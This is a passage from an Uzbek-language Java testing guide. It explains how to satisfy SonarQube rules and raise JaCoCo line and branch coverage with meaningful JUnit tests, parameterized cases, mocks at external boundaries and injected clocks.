        }
    }
}
```

```java
// Arxitektor yondashuvi: holat parametrga, shart yo'q, murakkablik past.
@ParameterizedTest
@CsvSource({"5, true", "1, true", "0, false"})
void qoldiqSotuvHolatiniBelgilaydi(int qoldiq, boolean sotuvda) {
    Mahsulot m = new Mahsulot("SKU-1", qoldiq);
    assertEquals(sotuvda, m.sotuvdaMi());
}
```

### 17.4 Assertion siz test: Sonar uni aniqlaydi va u foydasiz

Bu yerda aniq qoidalar bor. `java:S2699` assertion siz test metodini belgilaydi. `java:S2187` ichida hech qanday test metodi yo'q, ammo nomi `Test` bilan tugagan sinfni belgilaydi. Ikkisi ham Bug yoki Code Smell sifatida chiqadi va yangi kodda paydo bo'lsa quality gate ni yiqitadi.

Muhim nozik joy: Sonar assertion ni kutubxona ro'yxati bo'yicha taniydi. JUnit `Assertions`, AssertJ `assertThat`, Mockito `verify` va `Hamcrest` taniladi. Agar siz o'z yordamchi metodingiz ichiga assertion ni yashirsangiz, Sonar uni ko'rmasligi mumkin va noto'g'ri issue chiqadi. Yechim: yordamchi metodni testdan tashqariga olmaslik yoki uni AssertJ `SoftAssertions` bilan ochiq yozish.

```java
// Sonar uchun ham, odam uchun ham ravshan: assertion test metodining ichida.
@Test
void bekorQilinganBuyurtmaQoldiqniQaytaradi() {
    Buyurtma b = servis.yarat("SKU-1", 3);
    servis.bekorQil(b.id());
    assertThat(ombor.qoldiq("SKU-1")).isEqualTo(10);
    assertThat(servis.topish(b.id()).holat()).isEqualTo(Holat.BEKOR);
}
```

Yana bir tuzoq: `@Disabled` bilan o'chirilgan test. `java:S1607` uni issue qiladi va shu test qamrovga ham hissa qo'shmaydi. O'chirilgan test ikki yo'ldan birini tanlashi kerak: tuzatiladi yoki o'chiriladi.

### 17.5 Istisnoni tekshirish: `assertThrows` va xabarni ham tekshirish

`catch` bloki JaCoCo uchun alohida yo'l. Agar istisno yo'li testda hech qachon yurmasa, shu qatorlar qizil qoladi va ular ko'pincha eng xavfli qatorlar bo'ladi. Shuning uchun har bir ataylab tashlanadigan istisno uchun test bo'lishi kerak.

`java:S5778` qoidasi muhim: `assertThrows` lambdasi ichida faqat bitta tekshiriladigan chaqiruv bo'lsin. Aks holda istisno qaysi chaqiruvdan kelganini bilmaysiz.

```java
// Yomon: lambda ichida ikki chaqiruv, S5778 ishga tushadi.
assertThrows(QoldiqYetarsiz.class, () -> {
    servis.yarat("SKU-1", 100);
    servis.tasdiqla("SKU-1");
});
```

```java
// Sonar o'tadigan variant: bitta chaqiruv, tur va xabar tekshiriladi.
@Test
void qoldiqdanOshiqBuyurtmaIstisnoTashlaydi() {
    Buyurtma b = servis.yarat("SKU-1", 100); // tayyorgarlik lambdadan tashqarida
    QoldiqYetarsiz x = assertThrows(QoldiqYetarsiz.class, () -> servis.tasdiqla(b.id()));
    assertEquals("SKU-1 uchun qoldiq yetarsiz: so'rov 100, mavjud 10", x.getMessage());
    assertEquals("SKU-1", x.sku()); // tipli maydon xabardan ishonchliroq
}
```

Xabarni tekshirish ikki foyda beradi. Birinchidan, xato matnini yaratuvchi `String.format` qatori ham qamrovga kiradi. Ikkinchidan, noto'g'ri sababdan kelgan bir xil turdagi istisno testni o'tkazib yubormaydi.

### 17.6 Parametrik test bilan ko'p holatni kam kod bilan qoplash

Shox qamrovini oshirishning eng arzon yo'li parametrik test. Nusxa ko'chirilgan test metodlari esa `java:S4144` ("metodlar bir xil amalni bajarmasligi kerak") va duplication o'lchovi bilan muammo chiqaradi. Quality gate da `Duplicated Lines on New Code` sharti bo'lsa, nusxa ko'chirilgan beshta test metodi gate ni yiqitishi mumkin.

```java
@ParameterizedTest(name = "{0} summa {1} valyutada komissiya {2}")
@CsvSource({
    "kichik UZS,    500000,  UZS, 10000.00",
    "yirik UZS,    2000000,  UZS, 20000.00",
    "kichik valyuta, 500000, USD, 12500.000",
    "yirik valyuta, 2000000, USD, 30000.000"
})
void komissiyaStavkasiShartlarGaMosKelishi(String izoh, BigDecimal summa,
                                           Valyuta valyuta, BigDecimal kutilgan) {
    assertEquals(kutilgan, servis.komissiya(new Tolov(summa, valyuta)));
}
```

Chegaraviy qiymatlarni alohida yozish kerak, chunki `>` va `>=` farqi aynan chegarada ko'rinadi. `1000000` qiymati o'zi, undan bitta kichik va bitta katta qiymat uchta qator bilan beriladi. Null va bo'sh qiymat uchun `@NullAndEmptySource` ishlatiladi, shunda `if (x == null)` shoxi ham qoplanadi.

### 17.7 Mock ni o'rinli ishlatish: nimani mock qilish, nimani qilmaslik

Mock coverage ga qarshi ishlashi mumkin. Agar siz tekshirmoqchi bo'lgan mantiqni o'zini mock qilsangiz, haqiqiy kod ishga tushmaydi va qamrov pastda qoladi. Shu sababli mock chizig'i aniq: tashqi chegaradan tashqaridagi narsa mock qilinadi, domen mantiqi mock qilinmaydi.

```java
// Yomon: hisoblash mantiqi ham mock qilingan, haqiqiy kod ishga tushmaydi.
when(komissiyaHisoblagich.hisobla(any())).thenReturn(new BigDecimal("1000"));

// To'g'ri: faqat tashqi to'lov shlyuzi mock qilinadi.
when(tolovShlyuzi.yubor(any())).thenReturn(ShlyuzJavobi.muvaffaqiyat("TX-1"));
TolovNatijasi n = servis.amalgaOshir(buyruq); // haqiqiy mantiq yuradi
assertEquals(Holat.TOLANGAN, n.holat());
verify(tolovShlyuzi).yubor(argThat(s -> s.summa().equals(new BigDecimal("102000"))));
```

Sonar mock bilan bog'liq ikki narsani ushlaydi. `java:S1116` va shunga o'xshash qoidalar ishlatilmagan stub ni emas, lekin Mockito ning o'zi `strictStubs` rejimida ishlatilmagan stub uchun testni yiqitadi, bu esa ortiqcha stub ni tozalashga majbur qiladi. Ikkinchisi: faqat `verify` dan tashkil topgan test. U `java:S2699` dan o'tadi, ammo ishlab chiqarish mantiqini tekshirmaydi. Chiqish natijasi bor joyda natijani tekshiring, `verify` ni faqat tashqi ta'sir uchun qoldiring.

### 17.8 Spring kontekstiga bog'liq testni kamaytirish va tezlikni saqlash

Qamrov kontekstdan kelmaydi, kodning ishga tushishidan keladi. Shu sababli `@SpringBootTest` ni qamrov uchun ishlatish qimmat va sekin yo'l. Sonar uchun esa farqi yo'q: JaCoCo bir xil hisobni beradi, test unit yoki integratsion bo'lishidan qat'i nazar.

Amaliy qoida: domen va servis mantiqi oddiy JUnit testi bilan qoplanadi, kontekst faqat simlanish va konfiguratsiya to'g'riligini tekshiradi. Slice annotatsiyalar (`@WebMvcTest`, `@DataJpaTest`) kontekstni kichik qiladi va qamrovni aynan web yoki persistence qatlamida beradi.

```java
// Faqat controller qatlami. Servis mock, kontekst kichik, ishga tushish tez.
@WebMvcTest(BuyurtmaController.class)
class BuyurtmaControllerTest {

    @Autowired MockMvc mvc;
    @MockitoBean BuyurtmaServisi servis; // Spring Boot 3.4+ nomi

    @Test
    void notogriSumaUchun400Qaytaradi() throws Exception {
        mvc.perform(post("/api/buyurtmalar")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"sku\":\"SKU-1\",\"soni\":-1}"))
           .andExpect(status().isBadRequest())
           .andExpect(jsonPath("$.xatolar[0].maydon").value("soni"));
    }
}
```

Integratsion testning qamrovi hisobga olinishi uchun JaCoCo hisoboti ikki `exec` faylni birlashtirishi kerak. Testcontainers bilan ishlaydigan integratsion testlar odatda alohida profilda yuriladi va ularning hisoboti qo'shilmasa, coverage sun'iy ravishda past ko'rinadi.

```xml
<!-- unit va integratsion exec fayllarni bitta hisobotga birlashtirish -->
<execution>
  <id>merge-exec</id>
  <phase>verify</phase>
  <goals><goal>merge</goal></goals>
  <configuration>
    <fileSets>
      <fileSet><directory>${project.build.directory}</directory>
        <includes><include>jacoco*.exec</include></includes></fileSet>
    </fileSets>
    <destFile>${project.build.directory}/jacoco-aggregate.exec</destFile>
  </configuration>
</execution>
```

### 17.9 Vaqt, tasodif va tashqi holatga bog'liq kodni sinovga ochiq qilish

`LocalDate.now()` ni to'g'ridan to'g'ri chaqiradigan kodning ba'zi shoxlarini testda yurgizib bo'lmaydi. Masalan "oy oxiri" shoxi oyning oxirgi kunida ishlaydi va boshqa kunlari qizil qoladi. Bu holat Sonar da coverage yetishmasligi bo'lib ko'rinadi, aslida u dizayn muammosi.

```java
// Yomon: vaqt qotib qolgan, "oy oxiri" shoxini test yurgiza olmaydi.
public boolean hisobotYuborilsinmi() {
    return LocalDate.now().getDayOfMonth() == LocalDate.now().lengthOfMonth();
}

// Sonar o'tadigan dizayn: Clock injektsiya qilinadi, har ikki shox testga ochiq.
private final Clock clock;
public boolean hisobotYuborilsinmi() {
    LocalDate bugun = LocalDate.now(clock);
    return bugun.getDayOfMonth() == bugun.lengthOfMonth();
}
```

```java
@Test
void oyOxiridaHisobotYuboriladi() {
    Clock qotirilgan = Clock.fixed(Instant.parse("2025-10-31T09:00:00Z"), ZoneOffset.UTC);
    assertTrue(new HisobotServisi(qotirilgan).hisobotYuborilsinmi());
}
```

Tasodifiy qiymat uchun ham xuddi shu yo'l: `Random` yoki `UUID` generatori interfeys orqali beriladi. Qo'shimcha foyda bor: `java:S2245` qoidasi xavfsizlikka ta'sir qiladigan joyda `java.util.Random` ishlatilishini belgilaydi, generatorni ajratsangiz uni `SecureRandom` ga almashtirish bir joyda bo'ladi. `Thread.sleep` esa testda `java:S2925` bilan belgilanadi, uning o'rniga Awaitility yoki qotirilgan clock ishlatiladi.

### 17.10 Testni o'qiydigan qilib yozish: nom, tuzilish, ma'lumot

Sonar test fayllarida ham naming, murakkablik va duplication qoidalarini qo'llaydi. Shuning uchun o'qilishi oson test ko'pincha avtomatik ravishda issue siz test bo'ladi. Uchta amaliy nuqta bor.

Birinchi: metod nomi kutilgan xatti-harakatni aytsin. `test1` yoki `testHisobla` nomi naming convention qoidasidan o'tsa ham, yiqilgan testning sababini aytmaydi. Ikkinchi: tuzilish uch blokdan iborat bo'lsin va ularning orasi bo'sh qatorlar bilan ajratilsin. Uchinchi: test ma'lumoti builder orqali tayyorlansin, shunda nusxa ko'chirish kamayadi va duplication o'lchovi oshmaydi.

```java
// Test ma'lumoti builder: har testda faqat farq qiladigan maydon ko'rinadi.
static BuyurtmaBuilder buyurtma() {
    return new BuyurtmaBuilder().sku("SKU-1").soni(1).valyuta(Valyuta.UZS);
}

@Test
void valyutaBuyurtmasiUstamaBilanHisoblanadi() {
    Buyurtma b = buyurtma().valyuta(Valyuta.USD).soni(2).qur();

    BigDecimal jami = servis.jamiSumma(b);

    assertEquals(new BigDecimal("201000.000"), jami);
}
```

### 17.11 Qamrovni oshirish uchun yozilgan bo'sh testlarni tanib olish

Coverage sharti bosim qilganda jamoa ichida "qamrov testi" paydo bo'ladi. Ularni code review da tanib olish kerak, chunki Sonar ularning hammasini ushlamaydi. Quyidagi jadval eng ko'p uchraydigan shakllarni va yechimni beradi.

| Tuzoq | Sonar nima deydi | Yechim |
| --- | --- | --- |
| Assertion siz chaqiruv | `java:S2699` issue chiqaradi | Kutilgan natijani assertion qilish |
| Faqat `assertNotNull(natija)` | Hech narsa demaydi, gate o'tadi | Natijaning aniq qiymatini tekshirish |
| `assertTrue(true)` bilan yopish | Ba'zi hollarda S2699 dan o'tadi | Testni o'chirish yoki haqiqiy shart yozish |
| `@Disabled` qo'yib qoldirish | `java:S1607` issue chiqaradi | Tuzatish yoki o'chirish |
| Getter va setter uchun test | Hech narsa demaydi, coverage ko'tariladi | Generatsiya qilingan kodni exclusion ga olish |
| `toString` ni assertion qilish | Mo'rt test, qoida yo'q | Domen maydonini tekshirish |
| Mock ni mock bilan tekshirish | Qoida yo'q, qamrov yolg'on | Haqiqiy mantiqni yurgizish |
| Katta `@SpringBootTest` bilan hammasini ishga tushirish | Qoida yo'q, lekin CI sekinlashadi | Slice test va unit test ga bo'lish |
| `Thread.sleep` bilan kutish | `java:S2925` issue chiqaradi | Awaitility yoki qotirilgan clock |

Exclusion halol vosita, agar u faqat mantiqsiz kodni chetlab o'tsa. DTO, konfiguratsiya sinflari va generatsiya qilingan kod coverage hisobidan chiqarilishi mumkin. Servis yoki domen sinfini exclusion ga qo'yish esa raqamni bo'yash bo'ladi.

```properties
# Mantiqsiz kodni coverage hisobidan chiqarish. Servis sinflari bu yerda bo'lmaydi.
sonar.coverage.exclusions=\
  **/config/**,\
  **/dto/**,\
  **/*Application.java,\
  **/generated/**
# Test fayllari tahlil qilinadi, lekin coverage talabi ularga qo'llanmaydi.
sonar.tests=src/test/java
```

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Maqsad | Coverage foizini ko'tarish | Xatti-harakatni qayd etish, coverage natija sifatida kelishi |
| Holat tanlash | Baxtli yo'lni yozish | Chegara, null va istisno yo'llarini yozish |
| Istisno | `catch` ni testsiz qoldirish | `assertThrows` bilan tur va xabarni tekshirish |
| Ko'p holat | Metodni nusxa ko'chirish | `@ParameterizedTest` bilan jadval sifatida berish |
| Mock chizig'i | Qulay bo'lgan hamma narsani mock qilish | Faqat tashqi chegarani mock qilish |
| Spring | Hamma testga `@SpringBootTest` | Slice test, kontekst faqat simlanish uchun |
| Vaqt | `LocalDate.now()` to'g'ridan to'g'ri | `Clock` injektsiya, `Clock.fixed` bilan test |
| Kutish | `Thread.sleep(2000)` | Awaitility yoki deterministik vaqt |
| Exclusion | Coverage pasaysa servisni chiqarish | Faqat mantiqsiz kodni chiqarish, sababi yozilgan |
| Yiqilgan test | `@Disabled` qo'yish | Sababni tuzatish, flaky bo'lsa izolyatsiya qilish |

Integratsion test infratuzilmasi, Testcontainers va flaky testlarni barqarorlashtirish bo'yicha chuqur amaliyot testlash qo'llanmasidagi tegishli mavzularda beriladi. Bu yerda faqat ularning Sonar hisobiga qanday tushishi muhim edi.

### 17.12 Amalda qo'llash

- [ ] JaCoCo hisobotini ochib, shox qamrovi eng past uchta sinfni toping va ularning qoplanmagan shoxlarini sanab yozing.
- [ ] `java:S2699` va `java:S2187` issue lari ro'yxatini oling, har bir assertion siz testga kutilgan natija assertion ini qo'shing.
- [ ] `@Disabled` bilan belgilangan barcha testlarni toping, har biri uchun tuzatish yoki o'chirish qarorini qabul qiling.
- [ ] Nusxa ko'chirilgan test metodlarini bitta `@ParameterizedTest` ga yig'ib, chegaraviy qiymatlar uchun alohida qator qo'shing.
- [ ] `LocalDate.now()` va `new Random()` chaqiruvlarini loyiha bo'ylab grep qilib, ularni `Clock` va generator interfeysiga ko'chiring.
- [ ] Testlardagi `Thread.sleep` chaqiruvlarini Awaitility yoki qotirilgan vaqt bilan almashtiring.
- [ ] `sonar.coverage.exclusions` ro'yxatini ko'rib chiqing va mantiq saqlaydigan har bir sinfni undan chiqarib tashlang.
- [ ] Integratsion test `exec` faylining birlashtirilganini tekshirib, Sonar dagi coverage raqami lokal hisobot bilan mos kelishini tasdiqlang.

## 18. Branch va shart qamrovini to'liq yopish usullari (Covering Every Branch)

Quality gate `coverage` raqamiga qaraydi, lekin bu raqam ikki xil o'lchovdan yasalgan: qator qamrovi va shart qamrovi. Ko'p jamoa faqat birinchisini quvadi va keyin gate nega qizil bo'lganini tushunmaydi. Bu bobda Sonar shart qamrovini qanday hisoblashini, bytecode da nechta tarmoq paydo bo'lishini va har bir tarmoqni yopish uchun qanday test kerakligini ko'rib chiqamiz.

### 18.1 Line coverage va branch coverage farqi aniq misolda

Sonar ikkita alohida raqam saqlaydi. `line_coverage` bajarilishi mumkin bo'lgan qatorlardan qanchasi ishga tushganini aytadi. `branch_coverage`, UI da "Condition Coverage" deb nomlanadi, shartli o'tish nuqtalarining nechta yo'nalishi bosib o'tilganini aytadi. Umumiy `coverage` ikkisining birlashmasi: qoplangan shartlar va qatorlar yig'indisini barcha shartlar va qatorlar yig'indisiga bo'lish.

Ombor qoldig'ini zahiralash metodini olaylik. Bitta test bilan hamma qator bajariladi, lekin shartning ikkinchi yo'nalishi hech qachon sinalmaydi.

```java
// Zahiralash: bitta test bilan qatorlar 100% bo'ladi
public ReservationResult reserve(String sku, int qty) {
    Stock stock = stockRepository.findBySku(sku);   // 1-qator
    if (stock.available() < qty) {                  // 2-qator: shart
        return ReservationResult.rejected(sku);     // 3-qator
    }
    stock.decrease(qty);                            // 4-qator
    return ReservationResult.accepted(sku, qty);    // 5-qator
}
```

Faqat teskari holatni test qilsak, 3-qator qizil qoladi va JaCoCo 2-qatorni qisman qoplangan deb belgilaydi. Ya'ni qator qamrovi "kod ishga tushdimi" degan savolga javob beradi, tarmoq qamrovi "qaror qanday qabul qilindi" degan savolga. Biznes xatolari deyarli har doim ikkinchi savolda yashiradi.

### 18.2 Murakkab shart (`&&`, `||`) bytecode da nechta tarmoq hosil qiladi

JaCoCo manba kodni emas, bytecode ni o'qiydi. Har bir shartli o'tish buyrug'i, masalan `IFEQ` yoki `IF_ICMPLT`, ikkita natija beradi. Demak `if (a)` ikkita tarmoq, `if (a && b)` esa to'rtta tarmoq hosil qiladi, chunki kompilyator ikkita alohida o'tish yozadi. Uchta atomar shart oltita, to'rttasi sakkizta tarmoq beradi.

Muhim nuqta: JaCoCo har bir atomar shartni alohida sanaydi, kombinatsiyasini sanamaydi. Ya'ni bu MC/DC emas, oddiy branch coverage. To'rtta shart uchun 16 kombinatsiya bor, ammo 100% tarmoq qamrovi uchun odatda 4 yoki 5 test yetadi. Raqam yashil bo'lishi mumkin, holbuki kombinatsiyalarning yarmi sinalmagan.

Yana bir nozik joy: kompilyator va kod generatorlari yozgan sintetik kod ham tarmoq yasaydi. `String` ustidan `switch` `hashCode()` va `equals()` zanjirini yozadi. Lombok ning `@EqualsAndHashCode` generatsiyasi ham tarmoq qo'shadi, shuning uchun generatsiya qilingan kodni qamrovdan chiqarish kerak.

```xml
<!-- JaCoCo: branch qamrovini CLASS darajasida majburiy qilish -->
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution>
      <id>check-branches</id>
      <goals><goal>check</goal></goals>
      <configuration>
        <rules>
          <rule>
            <element>CLASS</element>
            <!-- generatsiya qilingan kod exclusions da chiqariladi -->
            <limits>
              <limit>
                <counter>BRANCH</counter>
                <value>COVEREDRATIO</value>
                <minimum>0.80</minimum>
              </limit>
            </limits>
          </rule>
        </rules>
      </configuration>
    </execution>
  </executions>
</plugin>
```

### 18.3 Qisqa tutashuv (short-circuit) va u qamrovga qanday ta'sir qiladi

`&&` chap tomon `false` bo'lsa o'ng tomonni bajarmaydi, `||` chap tomon `true` bo'lsa o'ng tomonga o'tmaydi. Qamrov uchun oqibat bitta: bajarilmagan shart tarmog'i ochiq qoladi. Agar `a` har doim `false` bo'ladigan testlar yozsak, JaCoCo "2 of 4 branches missed" deb ko'rsatadi.

Aksincha vaziyat ham bor: ba'zan `b` ni hech qanday test bilan bajarish imkoni yo'q, chunki `a` uni istisno qiladi. `java:S2589` keraksiz boolean ifodani, `java:S2583` natijasi har doim bir xil bo'ladigan shartni belgilaydi. Bunday holatda yechim test yozish emas, ortiqcha shartni o'chirish.

Amaliy qoida: eng arzon va eng ko'p rad etadigan shartni chapga qo'ying. Ammo esda tuting, chap shart juda tez rad etsa, o'ng tomonni yopish uchun maxsus test ma'lumotlari tayyorlash kerak bo'ladi.

### 18.4 Har bir tarmoqni yopish uchun kerakli test holatlari jadvali

To'lovni ushlab qolish (capture) qarorini olaylik. To'rtta atomar shart bor, demak JaCoCo sakkizta tarmoq sanaydi.

```java
// Capture sharti: 4 atomar shart, 8 tarmoq
public boolean canCapture(Payment payment, Merchant merchant) {
    return payment.isAuthorized()                       // A
            && !payment.isExpired(clock.instant())      // B
            && (payment.amount().compareTo(merchant.dailyLimit()) <= 0  // C
                || payment.isManuallyApproved());       // D
}
```

Short-circuit ni hisobga olib minimal test to'plamini tuzamiz. `-` belgisi shart umuman bajarilmaganini bildiradi.

| # | A: authorized | B: expired emas | C: limit ichida | D: qo'lda tasdiq | Yangi yopilgan tarmoq | Natija |
|---|---|---|---|---|---|---|
| 1 | false | - | - | - | A=false | false |
| 2 | true | false | - | - | A=true, B=false | false |
| 3 | true | true | true | - | B=true, C=true | true |
| 4 | true | true | false | true | C=false, D=true | true |
| 5 | true | true | false | false | D=false | false |

Besh test sakkizta tarmoqni yopadi. Jadvalni parametrli testga ko'chiramiz, shunda qamrov va hujjat bitta joyda turadi. Yangi shart qo'shilsa jadvalga yangi qator qo'shiladi va test to'plami avtomatik o'sadi. Shu usul review paytida ham foydali: tekshiruvchi jadvalga qarab qaysi kombinatsiya tushib qolganini darhol ko'radi.

```java
@ParameterizedTest(name = "[{index}] A={0} B={1} C={2} D={3} -> {4}")
@CsvSource({
    // A,     expired, limitIchida, qolda, kutilgan
    "false,   false,   true,        false, false",  // 1: A=false
    "true,    true,    true,        false, false",  // 2: B=false
    "true,    false,   true,        false, true",   // 3: C=true
    "true,    false,   false,       true,  true",   // 4: C=false, D=true
    "true,    false,   false,       false, false"   // 5: D=false
})
void canCapture_barchaTarmoq(boolean authorized, boolean expired,
                             boolean limitIchida, boolean qolda, boolean kutilgan) {
    Payment payment = PaymentFixture.builder()
            .authorized(authorized)
            .expiresAt(expired ? SOATDAN_OLDIN : SOATDAN_KEYIN)
            .amount(limitIchida ? new BigDecimal("50.00") : new BigDecimal("5000.00"))
            .manuallyApproved(qolda)
            .build();

    assertThat(service.canCapture(payment, MERCHANT_LIMIT_100)).isEqualTo(kutilgan);
}
```

### 18.5 `switch` va yangi `switch` ifodasini to'liq qoplash

Klassik `switch` har bir `case` uchun bitta tarmoq yasaydi va `default` ham tarmoq hisoblanadi. `default` yozilmagan bo'lsa, Sonar `java:S131` qoidasi bilan shikoyat qiladi, JaCoCo esa baribir yashirin "hech qaysi case mos kelmadi" yo'nalishini sanaydi.

Java 17 dan keyingi `switch` ifodasi `enum` ustida ishlatilganda holat o'zgaradi. Barcha konstanta sanab o'tilgan bo'lsa, kompilyator to'liqlikni (exhaustiveness) o'zi tekshiradi va `default` shart emas. Lekin kompilyator sinf alohida qayta kompilyatsiya qilinishi ehtimoliga qarshi yashirin tarmoq yozadi, u xato tashlaydi va JaCoCo da qoplanmagan qoladi. Shuning uchun `enum` ustidagi `switch` ifodasi ko'pincha "1 of N branches missed" deb ko'rsatiladi va bu normal holat.

```java
// Komissiya: switch ifodasi, enum to'liq sanalgan
BigDecimal commission(OrderStatus status, BigDecimal amount) {
    return switch (status) {
        case NEW, PENDING -> BigDecimal.ZERO;              // 1-tarmoq
        case PAID -> amount.multiply(new BigDecimal("0.02"));  // 2-tarmoq
        case SHIPPED -> amount.multiply(new BigDecimal("0.03")); // 3-tarmoq
        case CANCELLED -> amount.negate();                 // 4-tarmoq
    };
}

// Test: enum ning hamma qiymati bo'ylab yuramiz
@ParameterizedTest
@EnumSource(OrderStatus.class)
void commission_hammaHolatUchunAniqlangan(OrderStatus status) {
    assertThatNoException()
            .isThrownBy(() -> service.commission(status, new BigDecimal("100")));
}
```

`@EnumSource` ning qiymati shundaki, `enum` ga yangi konstanta qo'shilganda test avtomatik o'sadi va `switch` da unutilgan holat darhol yiqiladi.

### 18.6 Ternar operator va `Optional` zanjiri

Ternar operator `?:` ham ikkita tarmoq yasaydi, lekin u bitta qatorda yozilgani uchun qator qamrovi uni yashiradi. `return qty > 0 ? qty : 0;` qatori bitta test bilan yashil bo'ladi, holbuki tarmoqlarning yarmi ochiq. Ichma ich joylashgan ternar tarmoqlarni ko'paytiradi va o'qilishga oid qoidani ishga tushiradi.

`Optional` zanjirida `orElse` tarmoq yasamaydi, chunki u har doim argumentni hisoblaydi. `orElseGet`, `orElseThrow`, `filter` va `map` esa ichida shart saqlaydi: har bir oraliq qadam uchun qiymat bor va qiymat yo'q holatlari kerak.

```java
// Chegirma: har bir Optional qadami 2 holat talab qiladi
public BigDecimal discountFor(Long customerId, String couponCode) {
    return couponRepository.findByCode(couponCode)          // bor / yo'q
            .filter(Coupon::isActive)                        // aktiv / aktiv emas
            .filter(c -> c.appliesTo(customerId))            // tegishli / tegishli emas
            .map(Coupon::percent)                            // map ishga tushdi / tushmadi
            .orElse(BigDecimal.ZERO);
}
// Testlar: kupon yo'q; aktiv emas; mijozga tegishli emas; to'liq mos.
```

To'rtta test to'rtta tarmoq juftligini yopadi. Agar uchinchi testni yozmasak, `appliesTo` ning `false` yo'nalishi ochiq qoladi va eng xavfli biznes xatosi, ya'ni boshqa mijozning chegirmasini qo'llash, test bilan himoyalanmagan bo'ladi.

### 18.7 Sikl ichidagi shartlar va chegaraviy qiymatlar

Sikl o'zi ham shart: `for` va `while` ning sikl sharti ikkita tarmoq beradi. Birinchisi "yana bitta iteratsiya", ikkinchisi "sikl tugadi". Bo'sh kolleksiya bilan chaqirilmagan metodda bu ikkinchi tarmoq yopilsa ham, sikl ichidagi `if` ning tarmoqlari ochiq qolishi mumkin. Shuning uchun sikl uchun uch xil kirish ma'lumoti kerak: bo'sh, bitta element, bir nechta element.

`break` va `continue` yana tarmoq qo'shadi: "sikl shartidan chiqdi" va "break orqali chiqdi" yo'llari alohida sanaladi.

```java
// Birinchi mos tranzaksiyani topish
Optional<Transaction> firstOverLimit(List<Transaction> txs, BigDecimal limit) {
    for (Transaction tx : txs) {            // sikl sharti: 2 tarmoq
        if (tx.amount().compareTo(limit) > 0) {  // if: 2 tarmoq
            return Optional.of(tx);              // break yo'li
        }
    }
    return Optional.empty();                // sikl oxirigacha yetdi
}
// Kerakli kirish: [] ; [kichik] ; [kichik, katta] ; [katta, kichik]
```

Chegaraviy qiymatlar alohida masala. `compareTo(limit) > 0` uchun `amount` ning `limit` ga aniq teng holati muhim, chunki `>` va `>=` xatosi eng ko'p uchraydi. Tarmoq qamrovi bu xatoni ushlamaydi: teng holat `false` tarmog'ini yopadi va qamrov yashil ko'rinadi. Har bir solishtirishga uchta qiymat bering: past, teng, baland.

### 18.8 Istisno tarmog'ini yopish: mock orqali xato yuzaga keltirish

`try` va `catch` juftligi ham tarmoq yasaydi, lekin uni oddiy ma'lumot bilan yopish qiyin. Tashqi tizim xatosini yuzaga keltirish uchun mock dan foydalanamiz. Bu bobda mock mexanikasi tushuntirilmaydi, u testlash qo'llanmasidagi test duble mavzusida bor. Bu yerda muhimi: `catch` bloki ichidagi har bir qator va har bir qayta tashlash yo'li alohida tarmoq.

Ko'p jamoa `catch` ichida faqat `log.error` yozib qo'yadi. Natijada Sonar ikki marta shikoyat qiladi: qamrov yetmaydi va istisnoni yutib yuborish turkumidagi qoida ishga tushadi. To'g'ri yechim: `catch` da aniq xatti harakat bo'lsin va test shuni tekshirsin.

```java
@Test
void capture_gatewayXatosidaRetryGaQoyiladi() {
    // mock tashqi gateway ni xato tashlashga majburlaymiz
    when(gateway.capture(any())).thenThrow(new GatewayTimeoutException("504"));

    CaptureResult result = service.capture(PAYMENT_ID);

    // catch xatti harakati: PENDING_RETRY va outbox yozuvi
    assertThat(result.status()).isEqualTo(Status.PENDING_RETRY);
    verify(outbox).enqueue(argThat(e -> e.type().equals("CAPTURE_RETRY")));
    verify(paymentRepository).save(argThat(p -> p.attempts() == 1));
}

@Test
void capture_boshqaXatolarQaytaTashlanadi() {
    when(gateway.capture(any())).thenThrow(new IllegalStateException("buzilgan holat"));

    // ikkinchi catch tarmog'i: qayta tashlash yo'li
    assertThatThrownBy(() -> service.capture(PAYMENT_ID))
            .isInstanceOf(IllegalStateException.class);
    verify(outbox, never()).enqueue(any());
}
```

### 18.9 `finally` bloki va resurs yopilishi

`finally` bloki bytecode da ikki marta yoziladi: normal oqim uchun va istisno oqimi uchun. Shu sababli faqat muvaffaqiyatli yo'lni test qilsangiz, JaCoCo `finally` qatorlarini qisman qoplangan deb ko'rsatadi.

`try-with-resources` da kompilyator `close()` ni `null` tekshiruvi va bosiq istisno (suppressed exception) mantig'i bilan o'raydi. Hosil bo'lgan tarmoqlarning ba'zilarini Java kodidan turib yopish mumkin emas. Amaliy javob: ularni ta'qib qilmang, lekin `try` blokidan istisno chiqadigan testni albatta yozing.

```java
// Yomon: qo'lda finally, qo'shimcha null tarmog'i
Connection conn = null;
try {
    conn = dataSource.getConnection();
    return read(conn);
} finally {
    if (conn != null) {        // test qilish qiyin tarmoq
        conn.close();
    }
}

// Sonar o'tadigan variant: tarmoq kodda ko'rinmaydi
try (Connection conn = dataSource.getConnection()) {
    return read(conn);
}
```

### 18.10 Null tekshiruvlari: haqiqatan kerakmi yoki olib tashlash mumkinmi

Har bir `if (x != null)` ikkita tarmoq qo'shadi. Agar `x` hech qachon `null` bo'lmasa, siz yopilmaydigan tarmoq yaratib qamrovni o'zingiz pasaytirdingiz. Sonar ning oqim tahlili metod chegarasidan tashqariga har doim chiqmaydi, shuning uchun qarorni siz qabul qilasiz.

Mezon oddiy. Tashqi chegarada, ya'ni HTTP controller, Kafka consumer va tashqi API javobida null mumkin, demak tekshiruv kerak va u uchun test yoziladi. Ichki domen metodlarida null kelmasligi shartnoma bo'lishi kerak: konstruktorda bir marta `Objects.requireNonNull` qo'yib, ichki tekshiruvlarni olib tashlang.

`null` qaytaradigan metod ham har bir chaqiruv joyida ikkita tarmoq yasaydi. Bo'sh `List` yoki `Optional` qaytarsa, bu tarmoqlar yo'qoladi.

### 18.11 Shartni soddalashtirib tarmoqlar sonini kamaytirish

Eng tez qamrov yutug'i test yozishdan emas, tarmoq sonini kamaytirishdan keladi. Uchta usul bor: shartni nomlangan predikatga ajratish, `if` zanjirini `Map` ga aylantirish, shartni ma'lumotlar bazasiga ko'chirish.

Birinchi usul tarmoq sonini kamaytirmaydi, lekin ularni kichik testlanadigan bo'laklarga taqsimlaydi va `java:S3776` cognitive complexity qoidasini qondiradi. Ikkinchi usul tarmoqlarni butunlay yo'q qiladi: `Map` dagi izlash shartli o'tish emas. Uchinchi usul filtrlash siklini `WHERE` shartiga aylantiradi.

```sql
